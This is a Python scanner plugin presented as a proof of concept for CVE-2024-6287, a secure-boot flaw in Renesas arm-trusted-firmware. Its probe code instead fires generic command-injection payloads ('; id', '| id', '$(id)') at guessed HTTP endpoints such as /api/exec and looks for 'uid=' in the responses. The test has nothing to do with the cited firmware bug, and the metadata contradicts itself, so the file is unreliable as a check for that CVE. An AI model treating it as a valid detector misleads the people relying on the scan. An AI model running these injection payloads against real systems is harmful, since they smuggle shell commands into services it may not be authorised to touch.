#!/usr/bin/env python3
"""Active validation PoC for connected-vehicle vulnerability scanning."""
from __future__ import annotations

import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent))
from probe_utils import HTTPProbe, detection_confidence, service_open

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin


VULN = {
    "id": 44,
    "cve": "CVE-2024-6287",
    "year": 2024,
    "domain": "IVI/EVSE/车载SoC",
    "vendor_product": "Automotive embedded component",
    "component": "车载软件组件",
    "type": "输入校验/访问控制",
    "summary": "ASRG披露的车载组件漏洞，关联智能汽车软件供应链。",
    "source_description": "Incorrect Calculation vulnerability in Renesas arm-trusted-firmware allows Local Execution of Code.\n\n\nWhen checking whether a new image invades/overlaps with a previously loaded image the code neglects to consider a few cases. that could An attacker to bypass memory range restriction and overwrite an already loaded image partly or completely, which could result in code execution and bypass of secure boot.",
    "poc_status": "ZDI/ASRG公告；通常无公开完整PoC",
    "research_value": "多来自Pwn2Own/ASRG披露，适合攻击面枚举与固件安全研究。",
    "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2024-6287",
    "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2024-6287",
        "https://github.com/renesas-rcar/arm-trusted-firmware/commit/954d488a9798f8fda675c6b57c571b469b298f04",
        "https://asrg.io/security-advisories/cve-2024-6287/",
        "https://cveawg.mitre.org/api/cve/CVE-2024-6287"
    ],
    "affected": [
        {
            "vendor": "Renesas",
            "product": "rcar_gen3_v2.5",
            "versions": [
                {
                    "version": "6a96c18c474e6339fab93f54d52aa7dcc4b70e52",
                    "status": "affected",
                    "lessThan": "954d488a9798f8fda675c6b57c571b469b298f04",
                    "versionType": "git"
                }
            ]
        }
    ],
    "signature_tokens": [
        "CVE-2024-6287",
        "Automotive",
        "embedded",
        "component",
        "Incorrect",
        "Calculation",
        "vulnerability",
        "Renesas",
        "arm-trusted-firmware",
        "Local",
        "Execution",
        "Code",
        "When",
        "checking",
        "whether",
        "image",
        "invades",
        "overlaps",
        "previously",
        "loaded",
        "code",
        "neglects",
        "consider",
        "cases",
        "could",
        "bypass",
        "memory",
        "range",
        "restriction",
        "rcar_gen3_v2.5"
    ]
}



def _run_poc(plugin) -> dict:
    """Probe CVE-2024-6287: command injection parameter fuzzing on automotive HTTP interface."""
    params = plugin.params or {}
    target_ip = params.get("target_ip", getattr(plugin, "target_ip", "127.0.0.1"))
    port = int(params.get("port", 8080))
    tls = bool(params.get("tls", False))

    evidence = {
        "cve": "CVE-2024-6287",
        "target": f"{target_ip}:{port}",
        "technique": "HTTP behavioral probe - command injection parameter fuzzing on automotive interface",
    }

    active_port = None
    for try_port in [port, 80, 443, 8080, 9000]:
        if service_open(target_ip, try_port):
            active_port = try_port
            tls = try_port in (443, 8443)
            break

    if active_port is None:
        evidence["service_open"] = False
        return {
            "vulnerable": None,
            "evidence": evidence,
            "detection_confidence": detection_confidence("E", evidence, "no_service"),
            "requires_manual_review": True,
        }

    evidence["service_open"] = True
    evidence["actual_port"] = active_port
    probe = HTTPProbe(target_ip, active_port, tls=tls)

    injection_payloads = ["; id", "| id", "$(id)", "`id`", "'; id #"]
    injection_params = ["cmd", "input", "param", "value", "query", "data"]
    injection_results = {}
    for path in ["/api/command", "/api/exec", "/api/run", "/cgi-bin/exec"]:
        for inj in injection_payloads[:2]:
            r = probe.get(f"{path}?cmd={inj}")
            status = r.get("status")
            body = r.get("body_text", "")
            if status == 200 and any(kw in body for kw in ["uid=", "gid=", "root", "/bin/sh"]):
                evidence["command_injection_confirmed"] = True
                evidence["injection_path"] = path
                evidence["injection_payload"] = inj
                evidence["injection_response"] = body[:200]
                injection_results[path] = {"status": status, "hit": True}
                return {
                    "vulnerable": True,
                    "evidence": evidence,
                    "detection_confidence": detection_confidence("A", evidence, "command_injection_rce_observed"),
                    "requires_manual_review": False,
                }
            injection_results[f"{path}?{inj[:5]}"] = status

    evidence["injection_paths_tested"] = list(injection_results)
    r_root = probe.get("/")
    evidence["http_status"] = r_root.get("status")
    evidence["server_header"] = r_root.get("headers", {}).get("Server", "")

    return {
        "vulnerable": None,
        "evidence": evidence,
        "detection_confidence": detection_confidence("C", evidence, "injection_probe_no_hit"),
        "requires_manual_review": True,
    }

class Poc38CVE20246287AccessControlInputValidationAuditPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-NET-038"
    meta_poc_name = 'CVE-2024-6287 访问控制 Active Validation'
    meta_cve_id = 'CVE-2024-6287'
    meta_severity = 'Medium'
    meta_protocol = 'ocpp'
    meta_target_os = ['all']
    meta_required_params = ['service_banner']
    meta_profiles = ['network']
    meta_source_url = 'https://nvd.nist.gov/vuln/detail/CVE-2024-6287'
    meta_references       = ['https://nvd.nist.gov/vuln/detail/CVE-2024-6287']
    meta_attack_surface = '网络服务'
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "38_Automotive_Component_Input_Validation_Access_Control_Audit") if "VULN" in dir() else "38_Automotive_Component_Input_Validation_Access_Control_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc38CVE20246287AccessControlInputValidationAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
